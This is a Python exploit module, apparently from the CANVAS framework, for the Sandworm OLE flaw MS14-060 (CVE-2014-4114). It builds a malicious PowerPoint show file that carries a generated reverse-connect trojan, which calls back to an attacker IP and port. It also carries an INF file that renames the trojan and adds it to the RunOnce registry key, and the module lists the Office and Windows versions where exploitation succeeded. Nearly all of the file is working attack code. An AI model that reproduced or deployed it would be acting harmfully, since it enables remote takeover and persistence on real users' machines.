#!/usr/bin/env python

import sys
import os
import zipfile
import random

if '.' not in sys.path:
    sys.path.append('.')

from exploitutils import *
from canvasexploit import canvasexploit
from tcpexploit import *
from canvaserror import *
from shellcode import shellcodeGenerator
from MOSDEF import pelib
import canvasengine

NAME = 'Sandworm - MS14-060 - Windows OLE Remote Code Execution Vulnerability.'
DESCRIPTION = 'Allow remote attackers to execute arbitrary code via a crafted OLE object in an Office document'
VERSION = '1.0'


DOCUMENTATION = {
    'VENDOR' : 'Microsoft',
    'Repeatability' : 'Infinite',
    'CVE Name' : 'CVE-2014-4114',
    'CVE Url' : 'http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-4114',
    'Notes' : 'This exploit creates a blank PPSX file (Powerpoint show presentation), to use it you just have to add some stuff to the blank file with Powerpoint (MS Office 2010-2013).The PPSX contains two embedded OLE objects.The first object is the executable shellcode (PE .exe) with gif extension and the second one is a INF file. It looks like there is an issue with the handling of INF files. When a link to an INF file is inserted into a PPSX file, it is opened and immediately executed through the INF Default Install (InfDefaultInstall.exe) program.This vulnerability is a logic fault. The INF file rename the first embedded OLE object to .exe and add it to the registry. This PPSX may be served to vulnerable MS Office 2010 SP2 and 2013 installations on Windows 7 and will execute the embedded INF file without further user interaction on opening of the PPSX.'
    }

PROPERTY = {
    'TYPE' : 'Exploit',
    'SITE' : 'Clientside',
    'ARCH' : [['Windows']],
    'VERSION' : ['7']
    }

DEV = """
Affected Systems

This vulnerability affects Microsoft Windows Vista, 7, 8, 8.1 and Windows Server 2008 SP1
with MS Office 2010 SP2 to 2013 SP1. Also affects Windows Server 2008 SP2, 2008 R2, 2012 and
2012 R2 but we didn't test it on these systems.
Based on our analisys and testing, the most reliable setup is on Windows 7 platforms with
MS Office 2010 SP2 and 2013 SP1 because it doesn't need much user interaction besides opening the file.
On Windows Vista SP2, Windows 8.1 and Windows Server 2008 SP1 running MS Office 2013 SP1 or
2010 SP2 shows a security warning when try to execute the INF file.

Tested on:
- Microsoft Office 2010 SP2 (x32) on Windows 7 Ultimate N, EN (x32) - Successful exploitation
- Microsoft Office 2010 SP2 (x32) on Windows 7 SP1, EN (x32) - Successful exploitation
- Microsoft Office 2013 SP1 (x32) on Windows 7 Professional, EN (x64) - Successful exploitation
- Microsoft Office 2013 SP1 (x64) on Windows 7 Professional, EN (x64) - Successful exploitation
- Microsoft Office 2013 SP1 (x32) on Windows 7 Ultimate N, EN (x32) - Successful exploitation
- Microsoft Office 2013 SP1 (x32) on Windows 7 SP1, EN (x32) - Successful exploitation
- Microsoft Office 2010 Standard (x32) on Windows 7 Ultimate N, EN (x32) - Unsuccessful exploitation

With security warning (needs user interaction):
- Microsoft Office 2010 SP2 (x32) on Windows Vista SP2, EN (x32) - Successful exploitation
- Microsoft Office 2013 SP1 (x32) on Windows 8.1 , EN (x32) - Successful exploitation
- Microsoft Office 2013 SP1 (x32) on Windows Server 2008 SP1 , EN (x32) - Successful exploitation

"""

class theexploit(tcpexploit):
    def __init__(self):
        canvasexploit.__init__(self)
        self.name          = NAME
        self.ppsx_path     = "exploits/sandworm/Resources/blank.ppsx"
        self.slide1_path   = "exploits/sandworm/Resources/slide1.xml"
        self.ole1_path     = "exploits/sandworm/Resources/oleObject1.bin" # max EXE size for this one is 7500K,
        self.ole2_path     = "exploits/sandworm/Resources/oleObject2.bin"
        self.out_path      = "exploit.ppsx"
        self.exe_path      = ""
        self.callback_ip   = ""
        self.callback_port = ""
        self.subesp        = 0
        self.badstring     = "\00"

    def getArgs(self):
        self.out_path = self.argsDict.get('ppsx_path', self.out_path)
        self.callback_ip = self.engine.get_callback_interface().ip
        self.callback_port = int(self.argsDict.get('port', self.callback_port))

    def get_trojan(self):
        trojan = ''
        try:
            sc = shellcodeGenerator.win32()
            sc.addAttr('findeipnoesp', {'subespval': 0})
            sc.addAttr('revert_to_self_before_importing_ws2_32', None)
            sc.addAttr('tcpconnect', {'port' : self.callback_port,
                                      'ipaddress' : self.callback_ip})

            mosdef_type=self.engine.getMosdefType(canvasengine.WIN32MOSDEF_INTEL)
            mosdef_id=self.engine.getNewMosdefID(self)
            sc.addAttr("send_universal", {"mosdef_type": mosdef_type, "mosdef_id": mosdef_id})
            sc.addAttr("RecvExecDepSafe",{'socketreg': 'FDSPOT'})
            sc.addAttr("ExitThread",None)
            sc.vAllocSelf = True #we need to move to another page!

            myPElib = pelib.PElib()
            trojan = myPElib.createPEFileBuf(sc.get())

        except:
            import traceback
            traceback.print_exc(file=sys.stderr)

        return trojan

    def get_random_filename(self):
        return '{0:09}'.format(random.randint(1, 1000000000))

    def patch_pptx(self):

        inf = """
              [Version]
              Signature = "$CHICAGO$"

              [DestinationDirs]
              DefaultDestDir = 1

              [DefaultInstall]
              DelFiles = RxDel
              RenFiles = RxRename
              AddReg = RxStart

              [RxDel]
              template_.gif.exe
              [RxRename]
              template_.gif.exe, template_.gif
              [RxStart]
              HKLM,Software\Microsoft\Windows\CurrentVersion\RunOnce,Install,,%%1%%\%s.gif.exe
              ;"""

        random_name = self.get_random_filename()
        inf = inf.replace("template_",random_name)

        # This is a blank presentation created with PowerPoint 2010
        # It has two OLE objects, PowerPoint only let us define two OLE Verbs
        # execute and rename, so we will change the OLE verb after.
        zblank = zipfile.ZipFile(self.ppsx_path)

        if not self.out_path.endswith(".ppsx"):
            self.out_path += ".ppsx"

        zout = zipfile.ZipFile(self.out_path, "w")

        # We need to replace the slide with the OLE objects cause we need to
        # change the OLE verbs.
        zip_slide1 = zipfile.ZipInfo()
        zip_slide1.filename = "ppt/slides/slide1.xml"
        zip_slide1.compress_type = zipfile.ZIP_DEFLATED

        # This object will contain our trojan.
        zip_object1 = zipfile.ZipInfo()
        zip_object1.filename = "ppt/embeddings/oleObject1.bin"
        zip_object1.compress_type = zipfile.ZIP_DEFLATED

        # This object is an inf file, it will rename and execute the trojan.
        zip_object2 = zipfile.ZipInfo()
        zip_object2.filename = "ppt/embeddings/oleObject2.bin"
        zip_object2.compress_type = zipfile.ZIP_DEFLATED

        with open(self.slide1_path,'r') as fd:
                slide1 = fd.read()
                # Verbs < -2 will not execute any action, but they will still copy the
                # file to the tmp directory, so we can rename it and execute it after
                slide1 = slide1.replace('FIRST_VERB','-3')

                # This verb triggers the second action displayed on the dropbox when
                # you right click a file. Because this is a inf file, the action is
                # Install
                slide1 = slide1.replace('SECOND_VERB','3')

         # Replace the template with the actual trojan
        with open(self.ole1_path,'rb') as fd:
                object1 = fd.read()
                object1 = object1.replace("template_",random_name)
                trojan = self.get_trojan()
                object1 = object1.replace('A'*75000,trojan) # check if the size is ok.

        # Replace the template with the inf file
        with open(self.ole2_path,'rb') as fd:
                object2 = fd.read()
                object2 = object2.replace("template_",random_name)
                object2 = object2.replace('B'*4000,inf % random_name)


        # Place the patched files
        zout.writestr(zip_slide1, slide1)
        zout.writestr(zip_object1, object1)
        zout.writestr(zip_object2, object2)

        # tranfser the rest of the original files over to our patched pptx
        for f in zblank.namelist():
                if (f.endswith('slide1.xml') or
                    f.endswith('oleObject1.bin') or
                    f.endswith('oleObject2.bin')):
                    continue
                else:
                    zout.writestr(f, zblank.read(f))
        zblank.close()
        zout.close()

    def run(self):
        self.getArgs()

        if not self.out_path:
            self.log("Please provide a name for the ppsx file")
            return False

        if not self.callback_port:
            self.log("Please provide a callback port")
            return False

        self.patch_pptx()
        self.log("To complete the exploit preparation you must add some stuff to %%CANVASROOT%%/%s using MS Office 2010-2013" % self.out_path)
        return True

if __name__ == '__main__':
    print 'Running CANVAS %s Exploit v%s' % (DESCRIPTION, VERSION)
    app = theexploit()
    ret = standard_callback_commandline(app)
